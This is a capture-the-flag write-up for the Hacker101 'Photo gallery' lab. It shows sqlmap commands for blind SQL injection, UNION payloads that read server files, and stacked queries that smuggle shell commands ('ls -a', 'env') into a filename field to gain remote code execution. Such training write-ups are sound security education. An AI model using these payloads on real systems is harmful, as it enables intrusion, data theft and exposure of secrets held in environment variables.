# Hacker101 CTF: Photo gallery

### Flag №1

For the first, we, as usual, explore source code of a page and requests. There we can find how the page receives images.

```html
https://target.com/fetch?id=1
```
After some tests on sql-injection, we found that the target has 'blind sql-injection'. Let’s use 'sqlmap' and recover the structure of the database.

```bash
> sqlmap -u “https://target.com/fetch?id=1” -p id –batch –risk 3 – dump
```
I prefer to divide it into several parts and throw out unnecessary results.

```bash
> sqlmap -u  “https://target.com/fetch?id=1” -p id –batch –risk 3 –db
> sqlmap -u  “https://target.com/fetch?id=1” -p id –batch –risk 3 –D level5 –tables
> sqlmap -u  “https://target.com/fetch?id=1” -p id –batch –risk 3 –D level5 -T photos –dump
```

Several attempts after we will get the structure of photo table and these is will be the **FIRST FLAG**.

### Flag №2

For this task I had to use hints.

```html
Consider how you might build this system yourself. What would the query for fetch look like?
Take a few minutes to consider the state of the union
This application runs on the uwsgi-nginx-flask-docker image
```
First, what we need to do it’s find out when an 'AND' statement passes and vice versa. 
I will use 'id=0' for negative and 'id=1' for positive scenarios.
Second, we need to research the 'uwsgi-nginx-flask-docker' branch on github, for example, to understand what we can use with 'UNION' like a payload.

```html
https://target.com/fetch?id=0 UNION SELECT ‘uwsgi.ini’
```
Result:
```html
[uwsgi] module = main callable = app
```
Paste the main module following the documentation.

```html
https://target.com/fetch?id=0 UNION SELECT ‘main.py’
```
And we will get the ocean of useful information include the **SECOND FLAG**.

### Flag №3

Here I had to need hints too.

```html
That method of finding the size of an album seems suspicious
Stacked queries rarely work. But when they do, make absolutely sure that you're committed
Be aware of your environment
```
With that knowledge and the previous results contained in the 'main.py' we can pay attention on this:

```html
 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT)...
```

We can try to realize 'RCE(Remote Code Execution)'.

```html
https://target.com/fetch?id=1;update photos set filename=’* || ls -a > test’ where id=3;commit;--

then reload the main page and

https://target.com/fetch?id=0 union select ‘test’

```
It works. We can read files and find passed flags. But we need the third! Let’s back to the last hint and the last word in it.

```html
https://target.com/fetch?id=1;update photos set filename=’* || env > test’ where id=3;commit;--

then reload the main page and

https://target.com/fetch?id=0 union select ‘test’
```

Congratulations! Here are all challenge`s flags in one place!


